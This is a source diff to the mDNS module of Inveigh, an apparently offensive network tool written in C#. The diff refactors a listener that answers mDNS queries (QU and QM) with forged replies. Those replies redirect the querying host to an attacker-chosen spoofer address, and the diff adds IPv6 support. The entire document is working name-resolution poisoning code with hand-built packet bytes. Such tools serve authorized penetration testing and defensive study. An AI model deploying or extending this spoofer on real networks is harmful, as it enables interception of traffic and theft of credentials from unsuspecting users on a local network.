@@ -11,31 +11,14 @@ namespace Inveigh
     class MDNS
     {
 
-        public static void MDNSListener(string IP, string spooferIP, string mdnsTTL, string[] mdnsTypes)
+        public static void MDNSListener(string ipVersion, string IP, string spooferIP, string spooferIPv6, string mdnsTTL, string[] mdnsQuestions, string[] mdnsTypes)
         {
             byte[] spooferIPData = IPAddress.Parse(spooferIP).GetAddressBytes();
+            byte[] spooferIPv6Data = IPAddress.Parse(spooferIPv6).GetAddressBytes();
             byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
             Array.Reverse(ttlMDNS);
             IPEndPoint mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
-            UdpClient mdnsClient = new UdpClient();
-
-            try
-            {
-                mdnsClient.ExclusiveAddressUse = false;
-                mdnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-                mdnsClient.Client.Bind(mdnsEndpoint);
-                mdnsClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.251"));
-            }
-            catch
-            {
-
-                lock (Program.outputList)
-                {
-                    Program.outputList.Add(String.Format("[-] Error starting unprivileged mDNS spoofer, UDP port sharing does not work on all versions of Windows.", DateTime.Now.ToString("s")));
-                }
-
-                throw;
-            }
+            UdpClient mdnsClient = UDP.UDPListener("MDNS", IP, 5353, ipVersion);
 
             while (!Program.exitInveigh)
             {
@@ -57,37 +40,18 @@ namespace Inveigh
                         System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                         byte[] mdnsRequestRecordType = new byte[2];
                         System.Buffer.BlockCopy(udpPayload, (mdnsRequest.Length + 12), mdnsRequestRecordType, 0, 2);
-                        string mdnsRecordType = GetMDNSRecordType(mdnsRequestRecordType);
-                        mdnsResponseMessage = Util.CheckRequest(mdnsRequestHostFull, sourceIPAddress.ToString(), IP.ToString(), "MDNS");
+                        string mdnsRecordType = Util.GetRecordType(mdnsRequestRecordType);
+                        mdnsResponseMessage = Util.CheckRequest(mdnsRequestHostFull, sourceIPAddress.ToString(), IP.ToString(), "MDNS", "QU", mdnsQuestions);
 
                         if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                         {
 
                             if (Array.Exists(mdnsTypes, element => element == "QU"))
                             {
-
-                                using (MemoryStream ms = new MemoryStream())
-                                {
-                                    ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
-                                    ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
-                                    ms.Write(mdnsRequest, 0, mdnsRequest.Length);
-                                    ms.Write(mdnsRequestRecordType, 0, 2);
-                                    ms.Write((new byte[2] { 0x80, 0x01 }), 0, 2);
-                                    ms.Write(ttlMDNS, 0, 4);
-                                    ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
-                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                    IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, mdnsSourcePort);
-                                    mdnsClient.Connect(mdnsDestinationEndPoint);
-                                    mdnsClient.Send(ms.ToArray(), ms.ToArray().Length);
-                                    mdnsClient.Close();
-                                    mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
-                                    mdnsClient = new UdpClient();
-                                    mdnsClient.ExclusiveAddressUse = false;
-                                    mdnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-                                    mdnsClient.Client.Bind(mdnsEndpoint);
-                                    mdnsClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.251"));
-                                }
-
+                                byte[] mdnsResponse = MDNS.GetMDNSResponse("sniffer", ipVersion, mdnsTTL, sourceIPAddress, IPAddress.Parse(IP), spooferIPData, spooferIPv6Data, Util.IntToByteArray2(mdnsSourcePort), udpPayload);
+                                IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, mdnsSourcePort);
+                                UDP.UDPListenerClient(sourceIPAddress, mdnsSourcePort, mdnsClient, mdnsResponse);
+                                mdnsClient = UDP.UDPListener("MDNS", IP, 5353, ipVersion);
                             }
                             else if (!String.Equals(mdnsRecordType, "A"))
                             {
@@ -102,7 +66,7 @@ namespace Inveigh
 
                         lock (Program.outputList)
                         {
-                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1}({2}) received from {3} [{4}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, mdnsRecordType, sourceIPAddress, mdnsResponseMessage));
+                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QU) request for {1}({2}) from {3} [{4}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, mdnsRecordType, sourceIPAddress, mdnsResponseMessage));
                         }
 
 
@@ -117,37 +81,18 @@ namespace Inveigh
                         System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
                         byte[] mdnsRequestRecordType = new byte[2];
                         System.Buffer.BlockCopy(udpPayload, (mdnsRequest.Length + 12), mdnsRequestRecordType, 0, 2);
-                        string mdnsRecordType = GetMDNSRecordType(mdnsRequestRecordType);
-                        mdnsResponseMessage = Util.CheckRequest(mdnsRequestHostFull, sourceIPAddress.ToString(), IP.ToString(), "MDNS");
+                        string mdnsRecordType = Util.GetRecordType(mdnsRequestRecordType);
+                        mdnsResponseMessage = Util.CheckRequest(mdnsRequestHostFull, sourceIPAddress.ToString(), IP.ToString(), "MDNS", "QM", mdnsQuestions);
 
                         if (Program.enabledMDNS && String.Equals(mdnsResponseMessage, "response sent"))
                         {
 
                             if (Array.Exists(mdnsTypes, element => element == "QM"))
                             {
-
-                                using (MemoryStream ms = new MemoryStream())
-                                {
-                                    ms.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
-                                    ms.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
-                                    ms.Write(mdnsRequest, 0, mdnsRequest.Length);
-                                    ms.Write(mdnsRequestRecordType, 0, 2);
-                                    ms.Write((new byte[2] { 0x80, 0x01 }), 0, 2);
-                                    ms.Write(ttlMDNS, 0, 4);
-                                    ms.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
-                                    ms.Write(spooferIPData, 0, spooferIPData.Length);
-                                    IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(IPAddress.Parse("224.0.0.251"), 5353);
-                                    mdnsClient.Connect(mdnsDestinationEndPoint);
-                                    mdnsClient.Send(ms.ToArray(), ms.ToArray().Length);
-                                    mdnsClient.Close();
-                                    mdnsEndpoint = new IPEndPoint(IPAddress.Any, 5353);
-                                    mdnsClient = new UdpClient();
-                                    mdnsClient.ExclusiveAddressUse = false;
-                                    mdnsClient.Client.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
-                                    mdnsClient.Client.Bind(mdnsEndpoint);
-                                    mdnsClient.JoinMulticastGroup(IPAddress.Parse("224.0.0.251"));
-                                }
-
+                                byte[] mdnsResponse = MDNS.GetMDNSResponse("sniffer", ipVersion, mdnsTTL, sourceIPAddress, IPAddress.Parse(IP), spooferIPData, spooferIPv6Data, Util.IntToByteArray2(mdnsSourcePort), udpPayload);
+                                IPEndPoint mdnsDestinationEndPoint = new IPEndPoint(sourceIPAddress, mdnsSourcePort);
+                                UDP.UDPListenerClient(sourceIPAddress, mdnsSourcePort, mdnsClient, mdnsResponse);
+                                mdnsClient = UDP.UDPListener("MDNS", IP, 5353, ipVersion);
                             }
                             else if (!String.Equals(mdnsRecordType, "A"))
                             {
@@ -162,7 +107,7 @@ namespace Inveigh
 
                         lock (Program.outputList)
                         {
-                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1}({2}) received from {3} [{4}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, mdnsRecordType, sourceIPAddress, mdnsResponseMessage));
+                            Program.outputList.Add(String.Format("[+] [{0}] mDNS(QM) request for {1}({2}) from {3} [{4}]", DateTime.Now.ToString("s"), mdnsRequestHostFull, mdnsRecordType, sourceIPAddress, mdnsResponseMessage));
                         }
 
                     }
@@ -177,37 +122,40 @@ namespace Inveigh
 
         }
 
-        public static string GetMDNSRecordType(byte[] mdnsRequestRecordType)
+        public static byte[] GetMDNSResponse(string type, string ipVersion, string mdnsTTL, IPAddress sourceIPAddress, IPAddress destinationIPAddress, byte[] spooferIPData, byte[] spooferIPv6Data, byte[] udpSourcePort, byte[] udpPayload)
         {
-            string mdnsRecordType = "";
+            byte[] ttlMDNS = BitConverter.GetBytes(Int32.Parse(mdnsTTL));
+            Array.Reverse(ttlMDNS);
+            byte[] mdnsTransactionID = new byte[2];
+            System.Buffer.BlockCopy(udpPayload, 0, mdnsTransactionID, 0, 2);
+            string mdnsRequestHostFull = Util.ParseNameQuery(12, udpPayload);
+            byte[] mdnsRequest = new byte[mdnsRequestHostFull.Length + 2];
+            System.Buffer.BlockCopy(udpPayload, 12, mdnsRequest, 0, mdnsRequest.Length);
+            string[] mdnsRequestSplit = mdnsRequestHostFull.Split('.');
 
-            switch (BitConverter.ToString(mdnsRequestRecordType))
+            MemoryStream mdnsMemoryStream = new MemoryStream();
+
+            if(String.Equals(type, "sniffer"))
             {
-
-                case "00-01":
-                    mdnsRecordType = "A";
-                    break;
-
-                case "00-0C":
-                    mdnsRecordType = "PTR";
-                    break;
-
-                case "00-10":
-                    mdnsRecordType = "TXT";
-                    break;
-
-                case "00-1C":
-                    mdnsRecordType = "AAAA";
-                    break;
-
-                case "00-21":
-                    mdnsRecordType = "AAAA";
-                    break;
-
+                mdnsMemoryStream.Write((new byte[2] { 0x00, 0x89 }), 0, 2);
+                mdnsMemoryStream.Write(udpSourcePort, 0, 2);
+                mdnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
+                mdnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
             }
 
-            return mdnsRecordType;
+            mdnsMemoryStream.Write((new byte[2] { 0x00, 0x00 }), 0, 2);
+            mdnsMemoryStream.Write(mdnsTransactionID, 0, mdnsTransactionID.Length);
+            mdnsMemoryStream.Write((new byte[10] { 0x84, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 }), 0, 10);
+            mdnsMemoryStream.Write(mdnsRequest, 0, mdnsRequest.Length);
+            mdnsMemoryStream.Write((new byte[4] { 0x00, 0x01, 0x80, 0x01 }), 0, 4);
+            mdnsMemoryStream.Write(ttlMDNS, 0, 4);
+            mdnsMemoryStream.Write((new byte[2] { 0x00, 0x04 }), 0, 2);
+            mdnsMemoryStream.Write(spooferIPData, 0, spooferIPData.Length);
+
+
+            return mdnsMemoryStream.ToArray();
         }
 
     }
+
 }
